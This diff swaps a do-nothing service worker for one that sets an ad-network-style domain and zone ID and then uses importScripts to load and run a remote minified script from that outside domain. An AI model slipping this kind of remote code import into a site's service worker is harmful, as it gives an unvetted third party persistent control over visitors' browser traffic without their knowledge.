@@ -1,3 +1,6 @@
-self.addEventListener('install', e => { self.skipWaiting(); });
-self.addEventListener('activate', e => { self.clients.claim(); });
-self.addEventListener('fetch', e => {});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10241780
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
